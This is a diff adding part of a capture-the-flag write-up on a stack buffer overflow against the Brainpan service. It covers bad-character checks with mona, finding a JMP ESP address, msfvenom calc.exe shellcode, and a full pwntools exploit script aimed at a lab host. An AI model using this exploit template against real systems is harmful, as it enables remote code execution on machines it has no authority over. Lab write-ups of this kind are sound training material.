@@ -318,5 +318,154 @@ This shows that the EIP offset was at `524` bytes so I updated the `offset` vari
 ![overwrite EIP](/img/brainpan_overwrite_EIP_with_offset.png)
 
 #### Identifying bad characters
+Now that I had control of the EIP, I needed to validate that there were no bad characters that could cause termination or corruption of the input. I began by generating a 254-byte array of characters from `0x01` - `0xFF` using a short python script. `0x00` was excluded under the assumption this was already a "bad" termination character.
+
+```python
+#!/usr/bin/env python3
+
+for x in range(1, 256):
+    print(f"\\x{x:02x}", end='')
+print("")
+```
+
+```
+> python3 thm/oscp_bof_prep/bytearraygen/bytearraygen.py 
+\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+```
+
+I then replaced the payload in my exploit with the bytearray and reran the exploit. I then used mona's bytearray command to generate a similar byte array that I could compare against the contents of the stack, again excluding the null byte.
+
+```
+!mona bytearray -b "\x00"
+!mona compare -f C:\mona\brainpan\bytearray.bin -a 0028F930
+```
+
+Running a compare against the address at the stack pointer confirmed that there were no other bad characters.
+
+![mona bad_char comparison](/img/brainpan_mona_badchar_comparison.png)
+
+I added the nullbyte to my `bad_chars` variable for documentation and cleared the bytearray payload.
+
+```python
+bad_chars = "\x00"
+```
+
+#### Identifying a jump point
+Finally, I needed a jmp instruction without ASLR that I could use to hijack command execution. I ran the `!mona jmp -r esp -cpb "\x00"` command, passing the null byte as a bad char and it quickly identified a single instruction address that I could use `0x311712f3`. I converted the address to little-endian format due to conform to the targets architecture and updated the `retn` variable in my exploit.
+
+```python
+retn = "\xf3\x12\x17\x31"
+```
+
+#### Generating a test payload
+With all the components to exploit the target in place, I needed shellcode to confirm I could get remote code execution on the service. I used msfvenom to create a small shellcode to run calc.exe.
+
+```
+root@kali:~/ctf# msfvenom -p windows/exec CMD=calc.exe -b "x00" -f python -v payload | sed 's/b"/"/'
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 220 (iteration=0)
+x86/shikata_ga_nai chosen with final size 220
+Payload size: 220 bytes
+Final size of python file: 1180 bytes
+payload =  ""
+payload += "\xda\xdf\xd9\x74\x24\xf4\x5b\xba\xea\x73\x0c\xc9"
+payload += "\x31\xc9\xb1\x31\x83\xc3\x04\x31\x53\x14\x03\x53"
+payload += "\xfe\x91\xf9\x35\x16\xd7\x02\xc6\xe6\xb8\x8b\x23"
+payload += "\xd7\xf8\xe8\x20\x47\xc9\x7b\x64\x6b\xa2\x2e\x9d"
+payload += "\xf8\xc6\xe6\x92\x49\x6c\xd1\x9d\x4a\xdd\x21\xbf"
+payload += "\xc8\x1c\x76\x1f\xf1\xee\x8b\x5e\x36\x12\x61\x32"
+payload += "\xef\x58\xd4\xa3\x84\x15\xe5\x48\xd6\xb8\x6d\xac"
+payload += "\xae\xbb\x5c\x63\xa5\xe5\x7e\x85\x6a\x9e\x36\x9d"
+payload += "\x6f\x9b\x81\x16\x5b\x57\x10\xff\x92\x98\xbf\x3e"
+payload += "\x1b\x6b\xc1\x07\x9b\x94\xb4\x71\xd8\x29\xcf\x45"
+payload += "\xa3\xf5\x5a\x5e\x03\x7d\xfc\xba\xb2\x52\x9b\x49"
+payload += "\xb8\x1f\xef\x16\xdc\x9e\x3c\x2d\xd8\x2b\xc3\xe2"
+payload += "\x69\x6f\xe0\x26\x32\x2b\x89\x7f\x9e\x9a\xb6\x60"
+payload += "\x41\x42\x13\xea\x6f\x97\x2e\xb1\xe5\x66\xbc\xcf"
+payload += "\x4b\x68\xbe\xcf\xfb\x01\x8f\x44\x94\x56\x10\x8f"
+payload += "\xd1\xa9\x5a\x92\x73\x22\x03\x46\xc6\x2f\xb4\xbc"
+payload += "\x04\x56\x37\x35\xf4\xad\x27\x3c\xf1\xea\xef\xac"
+payload += "\x8b\x63\x9a\xd2\x38\x83\x8f\xb0\xdf\x17\x53\x19"
+payload += "\x7a\x90\xf6\x65"
+```
+
+I then updated the padding variable to provide 16 bytes of nop instructions for the payload to destroy if it needed to decode any of these instructions.
+
+```python
+padding = "x90" * 16
+```
+
+With these generated, I had my first full exploit for the brainpan service.
+
+```python
+#!/usr/bin/env python3
+
+import sys
+from pwn import *
+
+# context vars
+context.arch = 'amd64'
+
+# target
+target = remote('192.168.0.14', 9999, typ='tcp')
+
+# target-specific vars
+
+# payload vars
+total_payload_size = 1000
+offset = 524
+overflow = "A" * offset
+retn = "\xf3\x12\x17\x31"
+padding = "\x90" * 16
+bad_chars = "\x00"
+#root@kali:~/ctf# msfvenom -p windows/exec CMD=calc.exe -b "x00" -f python -v payload | sed 's/b"/"/'
+payload =  ""
+payload += "\xda\xdf\xd9\x74\x24\xf4\x5b\xba\xea\x73\x0c\xc9"
+payload += "\x31\xc9\xb1\x31\x83\xc3\x04\x31\x53\x14\x03\x53"
+payload += "\xfe\x91\xf9\x35\x16\xd7\x02\xc6\xe6\xb8\x8b\x23"
+payload += "\xd7\xf8\xe8\x20\x47\xc9\x7b\x64\x6b\xa2\x2e\x9d"
+payload += "\xf8\xc6\xe6\x92\x49\x6c\xd1\x9d\x4a\xdd\x21\xbf"
+payload += "\xc8\x1c\x76\x1f\xf1\xee\x8b\x5e\x36\x12\x61\x32"
+payload += "\xef\x58\xd4\xa3\x84\x15\xe5\x48\xd6\xb8\x6d\xac"
+payload += "\xae\xbb\x5c\x63\xa5\xe5\x7e\x85\x6a\x9e\x36\x9d"
+payload += "\x6f\x9b\x81\x16\x5b\x57\x10\xff\x92\x98\xbf\x3e"
+payload += "\x1b\x6b\xc1\x07\x9b\x94\xb4\x71\xd8\x29\xcf\x45"
+payload += "\xa3\xf5\x5a\x5e\x03\x7d\xfc\xba\xb2\x52\x9b\x49"
+payload += "\xb8\x1f\xef\x16\xdc\x9e\x3c\x2d\xd8\x2b\xc3\xe2"
+payload += "\x69\x6f\xe0\x26\x32\x2b\x89\x7f\x9e\x9a\xb6\x60"
+payload += "\x41\x42\x13\xea\x6f\x97\x2e\xb1\xe5\x66\xbc\xcf"
+payload += "\x4b\x68\xbe\xcf\xfb\x01\x8f\x44\x94\x56\x10\x8f"
+payload += "\xd1\xa9\x5a\x92\x73\x22\x03\x46\xc6\x2f\xb4\xbc"
+payload += "\x04\x56\x37\x35\xf4\xad\x27\x3c\xf1\xea\xef\xac"
+payload += "\x8b\x63\x9a\xd2\x38\x83\x8f\xb0\xdf\x17\x53\x19"
+payload += "\x7a\x90\xf6\x65"
+postfix = "C" * (total_payload_size - offset - len(retn) - len(padding) - len(payload))
+
+buffer = "".join([
+    overflow,
+    retn,
+    padding,
+    payload,
+    postfix
+])
+
+# send exploit
+# sending payload
+target.recvuntil(">> ")
+log.info(f"sending payload of {len(buffer)} bytes")
+target.sendline(buffer)
+target.recvuntil("\n")
+
+# cleanup
+target.close()
+sys.exit(0)
+```
+
+I executed the new payload and was pleased to confirm that I had RCE.
+
+![pop calc](/img/brainpan_pop_calc.png)
 
 ## Summary
